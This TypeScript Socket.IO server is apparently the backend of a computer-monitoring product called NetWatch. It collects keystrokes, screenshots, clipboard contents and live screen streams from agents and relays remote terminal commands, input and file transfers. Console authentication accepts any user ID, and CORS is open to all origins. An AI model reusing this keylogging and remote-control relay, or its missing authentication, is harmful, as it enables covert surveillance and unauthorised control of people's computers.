import "dotenv/config";
import express from "express";
import { createServer } from "http";
import { Server, Namespace, Socket } from "socket.io";
import cors from "cors";
import { PrismaClient } from "@prisma/client";

const app = express();
const httpServer = createServer(app);
const prisma = new PrismaClient();

const FRONTEND_URL = process.env.FRONTEND_URL || "http://localhost:3000";
const PORT = parseInt(process.env.PORT || "4000", 10);

// CORS configuration
app.use(
  cors({
    origin: "*",
    credentials: true,
  }),
);

app.use(express.json());

// Health check endpoint
app.get("/health", (req, res) => {
  res.json({ status: "ok", timestamp: new Date().toISOString(), version: "3" });
});

// Socket.IO options shared between both servers
const socketOptions = {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true,
  },
  transports: ["websocket", "polling"] as ("websocket" | "polling")[],
  allowEIO3: true,
};

// Primary Socket.IO server at default /socket.io path
const io = new Server(httpServer, socketOptions);

// Secondary Socket.IO server at /nw-socket/socket.io path
// This handles connections that come through proxy with /nw-socket prefix
const ioNwSocket = new Server(httpServer, {
  ...socketOptions,
  path: "/nw-socket/socket.io",
});

// Connected agents and consoles tracking (shared between both servers)
interface ConnectedAgent {
  socketId: string;
  computerId: string;
  connectedAt: Date;
  namespace: Namespace;
}

interface ConnectedConsole {
  socketId: string;
  userId: string;
  watchingComputers: Set<string>;
}

const connectedAgents = new Map<string, ConnectedAgent>();
const connectedConsoles = new Map<string, ConnectedConsole>();

// All console namespaces for broadcasting
const allConsoleNamespaces: Namespace[] = [];
const allAgentNamespaces: Namespace[] = [];

// Helper function to broadcast to all console namespaces
function broadcastToConsoles(event: string, data: unknown) {
  for (const ns of allConsoleNamespaces) {
    ns.emit(event, data);
  }
}

// Helper function to emit to watching consoles across all namespaces
function emitToWatching(computerId: string, event: string, data: unknown) {
  for (const ns of allConsoleNamespaces) {
    ns.to(`watching:${computerId}`).emit(event, data);
  }
}

// Setup agent namespace handlers
function setupAgentNamespace(agentNs: Namespace, consoleNs: Namespace) {
  allAgentNamespaces.push(agentNs);

  agentNs.on("connection", (socket: Socket) => {
    console.log(`Agent connected: ${socket.id} (path: ${agentNs.name})`);

    // Auth handler
    socket.on("auth", async (data: {
      machineId: string;
      hostname: string;
      osType: string;
      osVersion: string;
      macAddress: string;
      ipAddress: string;
      agentVersion: string;
    }) => {
      try {
        console.log(`Agent auth attempt: ${data.hostname} (${data.macAddress})`);

        let computer = await prisma.computer.findFirst({
          where: {
            OR: [{ macAddress: data.macAddress }, { hostname: data.hostname }],
          },
        });

        if (!computer) {
          const org = await prisma.organization.findFirst();
          if (!org) {
            console.error("No organization found - agent cannot register");
            socket.emit("auth_error", { message: "No organization found" });
            return;
          }

          computer = await prisma.computer.create({
            data: {
              name: data.hostname,
              hostname: data.hostname,
              macAddress: data.macAddress,
              ipAddress: data.ipAddress,
              osType: data.osType,
              osVersion: data.osVersion,
              agentVersion: data.agentVersion,
              status: "ONLINE",
              lastSeen: new Date(),
              organizationId: org.id,
            },
          });
          console.log(`New computer created: ${computer.hostname} (${computer.id})`);
        } else {
          computer = await prisma.computer.update({
            where: { id: computer.id },
            data: {
              ipAddress: data.ipAddress,
              osType: data.osType,
              osVersion: data.osVersion,
              agentVersion: data.agentVersion,
              status: "ONLINE",
              lastSeen: new Date(),
            },
          });
          console.log(`Existing computer updated: ${computer.hostname} (${computer.id})`);
        }

        connectedAgents.set(computer.id, {
          socketId: socket.id,
          computerId: computer.id,
          connectedAt: new Date(),
          namespace: agentNs,
        });

        socket.data = { computerId: computer.id };
        socket.join(`agent:${computer.id}`);

        socket.emit("auth_success", {
          computerId: computer.id,
          config: {
            screenshotInterval: 5000,
            activityLogInterval: 10000,
            keystrokeBufferSize: 100,
          },
        });

        broadcastToConsoles("agent_online", {
          computerId: computer.id,
          hostname: data.hostname,
        });

        console.log(`Agent authenticated: ${computer.hostname} (${computer.id})`);

        const pendingCommands = await prisma.deviceCommand.findMany({
          where: { computerId: computer.id, status: "PENDING" },
          orderBy: { createdAt: "asc" },
        });

        for (const cmd of pendingCommands) {
          socket.emit("command", {
            id: cmd.id,
            command: cmd.command,
            payload: cmd.payload ? JSON.parse(cmd.payload) : null,
          });
          await prisma.deviceCommand.update({
            where: { id: cmd.id },
            data: { status: "SENT", sentAt: new Date() },
          });
        }
      } catch (error) {
        console.error("Agent auth error:", error);
        socket.emit("auth_error", { message: "Authentication failed" });
      }
    });

    // Legacy register handler
    socket.on("register", async (data: { computerId: string; apiKey?: string }) => {
      const { computerId } = data;
      try {
        await prisma.computer.update({
          where: { id: computerId },
          data: { status: "ONLINE", lastSeen: new Date() },
        });

        connectedAgents.set(computerId, {
          socketId: socket.id,
          computerId,
          connectedAt: new Date(),
          namespace: agentNs,
        });

        socket.data = { computerId };
        socket.join(`agent:${computerId}`);
        socket.emit("registered", { success: true });
        broadcastToConsoles("agent_online", { computerId });
        console.log(`Agent registered (legacy): ${computerId}`);
      } catch (error) {
        console.error("Agent registration error:", error);
        socket.emit("registered", { success: false, error: "Registration failed" });
      }
    });

    // Heartbeat handler
    socket.on("heartbeat", async (data: {
      cpuUsage: number;
      memoryUsage: number;
      diskUsage: number;
      activeWindow?: string;
      activeProcess?: string;
      isIdle: boolean;
      idleTime: number;
    }) => {
      const computerId = socket.data?.computerId;
      if (!computerId) return;

      try {
        await prisma.computer.update({
          where: { id: computerId },
          data: {
            lastSeen: new Date(),
            cpuUsage: data.cpuUsage,
            memoryUsage: data.memoryUsage,
            diskUsage: data.diskUsage,
            status: "ONLINE",
          },
        });
        emitToWatching(computerId, "heartbeat", { computerId, ...data });
      } catch (error) {
        console.error("Error updating heartbeat:", error);
      }
    });

    // Screen frame handler
    socket.on("screen_frame", (data: { computerId: string; frame: string; timestamp: number }) => {
      const computerId = socket.data?.computerId || data.computerId;
      emitToWatching(computerId, "screen_frame", { ...data, computerId });
    });

    // Activity handler
    socket.on("activity", async (data: {
      computerId: string;
      type: string;
      applicationName: string;
      windowTitle: string;
      duration: number;
      category?: string;
    }) => {
      try {
        await prisma.activityLog.create({
          data: {
            computerId: data.computerId,
            type: data.type,
            applicationName: data.applicationName,
            windowTitle: data.windowTitle,
            duration: data.duration,
            category: data.category,
            startTime: new Date(),
          },
        });
        emitToWatching(data.computerId, "activity", data);
      } catch (error) {
        console.error("Error saving activity:", error);
      }
    });

    // Keystrokes handler
    socket.on("keystrokes", async (data: {
      computerId: string;
      strokes: Array<{ keys: string; applicationName: string; windowTitle: string; timestamp: number }>;
    }) => {
      try {
        for (const stroke of data.strokes) {
          await prisma.keylog.create({
            data: {
              computerId: data.computerId,
              keystrokes: stroke.keys,
              application: stroke.applicationName,
              windowTitle: stroke.windowTitle,
              capturedAt: new Date(stroke.timestamp),
            },
          });
        }
        emitToWatching(data.computerId, "keystrokes", data);
      } catch (error) {
        console.error("Error saving keystrokes:", error);
      }
    });

    // Screenshot handler
    socket.on("screenshot", async (data: { computerId: string; imageData: string; activeWindow?: string }) => {
      try {
        const screenshot = await prisma.screenshot.create({
          data: {
            computerId: data.computerId,
            imageUrl: data.imageData,
            activeWindow: data.activeWindow,
          },
        });
        emitToWatching(data.computerId, "screenshot", { ...data, id: screenshot.id });
      } catch (error) {
        console.error("Error saving screenshot:", error);
      }
    });

    // Clipboard handler
    socket.on("clipboard", async (data: { computerId: string; content: string; contentType: string }) => {
      try {
        await prisma.clipboardLog.create({
          data: {
            computerId: data.computerId,
            content: data.content,
            contentType: data.contentType || "TEXT",
          },
        });
        emitToWatching(data.computerId, "clipboard", data);
      } catch (error) {
        console.error("Error saving clipboard:", error);
      }
    });

    // Processes handler
    socket.on("processes", (data: { computerId: string; processes: Array<{ name: string; pid: number; cpu: number; memory: number }> }) => {
      emitToWatching(data.computerId, "processes", data);
    });

    // System info handler
    socket.on("system_info", async (data: { computerId: string; cpuUsage: number; memoryUsage: number; diskUsage: number }) => {
      try {
        await prisma.computer.update({
          where: { id: data.computerId },
          data: {
            cpuUsage: data.cpuUsage,
            memoryUsage: data.memoryUsage,
            diskUsage: data.diskUsage,
            lastSeen: new Date(),
          },
        });
        emitToWatching(data.computerId, "system_info", data);
      } catch (error) {
        console.error("Error updating system info:", error);
      }
    });

    // Command result handler
    socket.on("command_result", async (data: { commandId: string; success: boolean; output?: string; error?: string }) => {
      try {
        await prisma.deviceCommand.update({
          where: { id: data.commandId },
          data: {
            status: data.success ? "EXECUTED" : "FAILED",
            response: data.output || data.error,
            executedAt: new Date(),
          },
        });
        broadcastToConsoles("command_result", data);
      } catch (error) {
        console.error("Error updating command result:", error);
      }
    });

    // File transfer progress handler
    socket.on("file_transfer_progress", (data: { transferId: string; progress: number; status: string }) => {
      broadcastToConsoles("file_transfer_progress", data);
    });

    // Disconnect handler
    socket.on("disconnect", async () => {
      const computerId = socket.data?.computerId;

      if (computerId) {
        connectedAgents.delete(computerId);
        try {
          await prisma.computer.update({
            where: { id: computerId },
            data: { status: "OFFLINE", lastSeen: new Date() },
          });
        } catch (error) {
          console.error("Error updating computer status:", error);
        }
        broadcastToConsoles("agent_offline", { computerId });
        console.log(`Agent disconnected: ${computerId}`);
      }
    });
  });
}

// Setup console namespace handlers
function setupConsoleNamespace(consoleNs: Namespace) {
  allConsoleNamespaces.push(consoleNs);

  consoleNs.on("connection", (socket: Socket) => {
    console.log(`Console connected: ${socket.id}`);

    socket.on("authenticate", (data: { userId: string; token?: string }) => {
      connectedConsoles.set(socket.id, {
        socketId: socket.id,
        userId: data.userId,
        watchingComputers: new Set(),
      });
      const onlineAgents = Array.from(connectedAgents.keys());
      socket.emit("auth_success", { onlineAgents });
    });

    socket.on("watch_computer", (data: { computerId: string }) => {
      const client = connectedConsoles.get(socket.id);
      if (client) {
        client.watchingComputers.add(data.computerId);
        socket.join(`watching:${data.computerId}`);

        const agent = connectedAgents.get(data.computerId);
        if (agent) {
          agent.namespace.to(agent.socketId).emit("start_screen_stream", { quality: 60, fps: 5 });
        }
      }
    });

    socket.on("unwatch_computer", (data: { computerId: string }) => {
      const client = connectedConsoles.get(socket.id);
      if (client) {
        client.watchingComputers.delete(data.computerId);
        socket.leave(`watching:${data.computerId}`);

        // Check if anyone still watching
        let stillWatching = false;
        for (const ns of allConsoleNamespaces) {
          const room = ns.adapter.rooms.get(`watching:${data.computerId}`);
          if (room && room.size > 0) {
            stillWatching = true;
            break;
          }
        }

        if (!stillWatching) {
          const agent = connectedAgents.get(data.computerId);
          if (agent) {
            agent.namespace.to(agent.socketId).emit("stop_screen_stream");
          }
        }
      }
    });

    socket.on("send_command", async (data: { computerId: string; command: string; payload?: Record<string, unknown> }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        try {
          const cmd = await prisma.deviceCommand.create({
            data: {
              computerId: data.computerId,
              command: data.command,
              payload: JSON.stringify(data.payload || {}),
              status: "PENDING",
            },
          });
          agent.namespace.to(agent.socketId).emit("command", {
            commandId: cmd.id,
            command: data.command,
            payload: data.payload,
          });
          socket.emit("command_sent", { commandId: cmd.id });
        } catch (error) {
          console.error("Error sending command:", error);
          socket.emit("command_error", { error: "Failed to send command" });
        }
      } else {
        socket.emit("command_error", { error: "Agent not online" });
      }
    });

    socket.on("remote_input", (data: { computerId: string; type: "mouse" | "keyboard"; event: Record<string, unknown> }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agent.namespace.to(agent.socketId).emit("remote_input", data);
      }
    });

    socket.on("terminal_command", (data: { computerId: string; command: string; sessionId: string }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agent.namespace.to(agent.socketId).emit("terminal_command", data);
      }
    });

    socket.on("file_transfer", async (data: {
      computerId: string;
      direction: "UPLOAD" | "DOWNLOAD";
      remotePath: string;
      localPath?: string;
      fileData?: string;
    }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        try {
          const transfer = await prisma.fileTransfer.create({
            data: {
              computerId: data.computerId,
              fileName: data.remotePath.split("/").pop() || "unknown",
              remotePath: data.remotePath,
              localPath: data.localPath || data.remotePath,
              direction: data.direction,
              status: "IN_PROGRESS",
            },
          });
          agent.namespace.to(agent.socketId).emit("file_transfer", { transferId: transfer.id, ...data });
          socket.emit("file_transfer_started", { transferId: transfer.id });
        } catch (error) {
          console.error("Error creating file transfer:", error);
          socket.emit("file_transfer_error", { error: "Failed to initiate transfer" });
        }
      }
    });

    socket.on("send_message", (data: { computerId: string; message: string; type: "INFO" | "WARNING" | "URGENT"; lockScreen?: boolean }) => {
      const agent = connectedAgents.get(data.computerId);
      if (agent) {
        agent.namespace.to(agent.socketId).emit("display_message", data);
        socket.emit("message_sent", { success: true });
      }
    });

    socket.on("disconnect", () => {
      const client = connectedConsoles.get(socket.id);
      if (client) {
        for (const computerId of client.watchingComputers) {
          let stillWatching = false;
          for (const ns of allConsoleNamespaces) {
            const room = ns.adapter.rooms.get(`watching:${computerId}`);
            if (room && room.size > 1) {
              stillWatching = true;
              break;
            }
          }
          if (!stillWatching) {
            const agent = connectedAgents.get(computerId);
            if (agent) {
              agent.namespace.to(agent.socketId).emit("stop_screen_stream");
            }
          }
        }
        connectedConsoles.delete(socket.id);
      }
      console.log(`Console disconnected: ${socket.id}`);
    });
  });
}

// Setup namespaces for primary socket.io server (default /socket.io path)
const agentNamespace = io.of("/agent");
const consoleNamespace = io.of("/console");
setupAgentNamespace(agentNamespace, consoleNamespace);
setupConsoleNamespace(consoleNamespace);

// Setup namespaces for secondary socket.io server (/nw-socket/socket.io path)
const agentNamespaceNw = ioNwSocket.of("/agent");
const consoleNamespaceNw = ioNwSocket.of("/console");
setupAgentNamespace(agentNamespaceNw, consoleNamespaceNw);
setupConsoleNamespace(consoleNamespaceNw);

// Start server
httpServer.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════════════╗
║             NetWatch Socket.io Server Started                     ║
╠═══════════════════════════════════════════════════════════════════╣
║  Port:     ${PORT.toString().padEnd(54)}║
║  Frontend: ${FRONTEND_URL.padEnd(54)}║
║                                                                   ║
║  Endpoints (both paths supported):                                ║
║  - /socket.io/agent     (Rust agent)                              ║
║  - /socket.io/console   (Dashboard)                               ║
║  - /nw-socket/socket.io/agent   (Electron agent)                  ║
║  - /nw-socket/socket.io/console (Dashboard via proxy)             ║
╚═══════════════════════════════════════════════════════════════════╝
  `);
});

// Graceful shutdown
process.on("SIGTERM", async () => {
  console.log("SIGTERM received, shutting down...");
  await prisma.$disconnect();
  httpServer.close(() => {
    process.exit(0);
  });
});
